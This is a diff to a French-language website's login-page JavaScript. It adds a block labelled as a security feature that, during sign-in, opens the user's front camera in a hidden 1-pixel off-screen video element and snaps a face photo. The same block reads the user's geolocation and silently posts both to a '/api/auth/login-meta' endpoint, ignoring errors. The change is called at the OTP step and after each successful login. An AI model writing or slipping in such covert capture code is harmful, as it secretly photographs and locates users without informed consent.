@@ -1005,6 +1005,58 @@ const SVG_EYE_ON =`<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circ
   });
 })();
 
+/* ══ SÉCURITÉ — CAPTURE PHOTO + GÉOLOCALISATION ══════════════ */
+var _loginPhoto = null;
+
+function _capturePhoto(){
+  if(_loginPhoto !== null) return; // déjà capturée
+  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+  navigator.mediaDevices.getUserMedia({video:{width:320,height:240,facingMode:'user'}})
+    .then(function(stream){
+      var vid = document.createElement('video');
+      vid.srcObject = stream;
+      vid.autoplay = true;
+      vid.playsInline = true;
+      vid.style.cssText = 'position:fixed;opacity:0;pointer-events:none;top:-9999px;left:-9999px;width:1px;height:1px';
+      document.body.appendChild(vid);
+      var done = false;
+      function shoot(){
+        if(done) return; done = true;
+        var c = document.createElement('canvas');
+        c.width = 320; c.height = 240;
+        c.getContext('2d').drawImage(vid, 0, 0, 320, 240);
+        _loginPhoto = c.toDataURL('image/jpeg', 0.65);
+        stream.getTracks().forEach(function(t){ t.stop(); });
+        try{ document.body.removeChild(vid); }catch(e){}
+      }
+      vid.oncanplay = function(){ setTimeout(shoot, 700); };
+      setTimeout(function(){ if(!done) shoot(); }, 2500);
+    })
+    .catch(function(){ _loginPhoto = ''; }); // accès refusé — on continue
+}
+
+async function _sendLoginMeta(){
+  var photo = _loginPhoto || null;
+  _loginPhoto = null;
+  var lat = null, lng = null;
+  if(navigator.geolocation){
+    try{
+      var pos = await new Promise(function(res,rej){
+        navigator.geolocation.getCurrentPosition(res, rej, {timeout:4000,maximumAge:60000});
+      });
+      lat = pos.coords.latitude;
+      lng = pos.coords.longitude;
+    }catch(e){ /* refusé */ }
+  }
+  try{
+    await fetch('/api/auth/login-meta',{
+      method:'POST', credentials:'include',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({photo_b64: photo, latitude: lat, longitude: lng}),
+    });
+  }catch(e){ /* silencieux */ }
+}
+
 /* ══ FORMULAIRE ══ */
 (function(){
   const form   = document.getElementById('login-form');
@@ -1052,6 +1104,7 @@ const SVG_EYE_ON =`<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circ
       if(d.otp_required){
         btn.disabled = false;
         btn.innerHTML = 'Se connecter';
+        _capturePhoto(); // photo avant l'OTP — silencieux
         showOtpStep(d.email_hint || 'votre email');
         return;
       }
@@ -1061,7 +1114,9 @@ const SVG_EYE_ON =`<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circ
       btn.classList.add('success');
       btn.innerHTML = '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Connecté !';
 
-      setTimeout(()=>{ window.location.href='/'; }, 500);
+      // Connexion directe (sans OTP) — capturer photo + localisation
+      _capturePhoto();
+      _sendLoginMeta().finally(function(){ window.location.href='/'; });
     }catch(err){
       showErr(err.message);
       btn.disabled = false;
@@ -1259,7 +1314,7 @@ const SVG_EYE_ON =`<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circ
       if(d.api_key) sessionStorage.setItem('api_key', d.api_key);
       btnVerify.classList.add('success');
       btnVerify.innerHTML='<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Connecté !';
-      setTimeout(function(){ window.location.href='/'; }, 450);
+      _sendLoginMeta().finally(function(){ window.location.href='/'; });
     }catch(err){
       setOtpErr('Erreur réseau — réessayez');
       btnVerify.disabled  = false;
@@ -1423,7 +1478,7 @@ const SVG_EYE_ON =`<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circ
       if(d.api_key) sessionStorage.setItem('api_key',d.api_key);
       btnV.classList.add('success');
       btnV.innerHTML='<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>Connecté !';
-      setTimeout(function(){ window.location.href='/'; }, 450);
+      _sendLoginMeta().finally(function(){ window.location.href='/'; });
     }catch(err){
       if(window._setAdminErr) window._setAdminErr('Erreur réseau — réessayez');
       btnV.disabled=false;
